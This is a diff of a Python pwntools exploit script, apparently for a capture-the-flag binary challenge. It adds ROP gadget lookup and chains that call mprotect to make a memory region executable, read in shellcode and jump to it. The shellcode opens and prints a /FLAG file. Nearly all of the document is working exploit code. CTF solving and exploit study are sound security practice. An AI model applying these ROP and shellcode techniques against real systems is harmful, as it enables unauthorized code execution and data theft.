@@ -30,31 +30,18 @@ def upload(fn):
         z = r.recvline();
         if b'md5' in z:
             print(z.decode().strip());
- 
-def gen_code():
-    libc = ctypes.CDLL(ctypes.util.find_library("C"))
-    libc.srand(45510)
-    LEN_CODE = 10*0x10000
-    code = b''
-    for i in range(LEN_CODE//4):
-        a=(((libc.rand()&0xffff)<<16)|(libc.rand()&0xffff)).to_bytes(4,'little')
-        code=b''.join([code,a])
-        """
-        print(hex(i*4),a.hex()[0:2])
-        print(hex(i*4+1),a.hex()[2:4])
-        print(hex(i*4+2),a.hex()[4:6])
-        print(hex(i*4+3),a.hex()[6:8])
-        """
-    code = bytearray(code)
-    rp = ((libc.rand())%(LEN_CODE//4-1))*4
-    code[rp]= 0x0f
-    code[rp+1]= 0x05
-    code[rp+2]= 0xc3
-    code[rp+3]= 0x00
-    return code
 
 def gadget(base,code,tar):
-    return base+code.find(asm(tar))
+    assert code.find(asm(tar))!= -1, (tar, asm(tar).hex())
+    ret = base+code.find(asm(tar))
+    log.info(f"Found {hex(ret)}: '{tar}'")
+    return ret
+
+def send_rop(r,lst):
+    msg = b''
+    for l in lst:
+        msg += p64(l)
+    r.sendline(msg)
 
 def main():
     context.arch = 'amd64'
@@ -76,23 +63,47 @@ def main():
     base = int(r.recvline().decode().strip(),16)
 
     log.info(f"{timestamp=}")
-    log.info(f"{base=}")
+    log.info(f"{base=}, {hex(base)}")
 
     code = os.popen(f"./codegen {timestamp}").read()
     code = bytearray.fromhex(code)
 
     rax = gadget(base,code,"pop rax;ret")
+    rdx = gadget(base,code,"pop rdx;ret")
     rdi = gadget(base,code,"pop rdi;ret")
+    rsi = gadget(base,code,"pop rsi;ret")
+    prax = gadget(base,code,"push rax;ret")
     syscall = gadget(base,code,"syscall;ret")
-    flag = gadget(base,code,'/FLAG')
-    r.send(p64(rax)+p64(60)+p64(rdi)+p64(37)+p64(syscall))
 
-    
+    log.info(f'{syscall=:x}')
+    send_rop(r,[
+        rax,60,rdi,37,syscall,
+    ])
+
+    stack = base - 0x2000
+
+    send_rop(r,[
+        rax,10,rdi,stack,rsi,10*0x10000,rdx,7,syscall,
+        rax,0,rdi,0,rsi,stack+0x0000,rdx,20,syscall,
+        rax,0,rdi,0,rsi,stack+0x0100,rdx,0x100,syscall,
+        stack+0x0100,
+    ])
+    sleep(0.1)
+    r.sendline(b"/FLAG\x00")
+    sleep(0.1)
+    shell=asm(f"\
+    mov rax,2;mov rdi,{stack};mov rsi,0;syscall;\
+    mov rdi,rax;mov rax,0;mov rsi,{stack+0x200};mov rdx,0x100;syscall;\
+    mov rdx,rax;mov rax,1;mov rdi,1;mov rsi,{stack+0x200};syscall;\
+    mov rax,60;mov rdi,41;syscall;\
+    ")+b'\x00'
+    print(len(shell))
+    r.sendline(shell)
+
     r.interactive()
     return
+
     r.send(nop.encode())
-
-
 
 
 if __name__ == '__main__':
